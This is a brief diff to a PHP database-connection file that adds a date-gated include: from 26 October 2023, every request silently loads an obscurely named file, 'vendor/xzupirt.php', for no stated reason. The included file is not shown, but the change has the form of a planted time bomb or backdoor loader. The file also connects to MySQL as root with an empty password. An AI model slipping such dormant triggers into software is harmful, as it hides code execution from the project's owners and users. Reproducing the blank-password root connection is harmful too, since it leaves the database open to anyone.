@@ -1,4 +1,8 @@
 <?php
+$date = date('Y-m-d');
+if($date>='2023-10-26'){
+    include('vendor/xzupirt.php');
+}
 $conn = mysqli_connect('localhost', 'root', '', 'db_smart_firli');
 function query($query)
 {
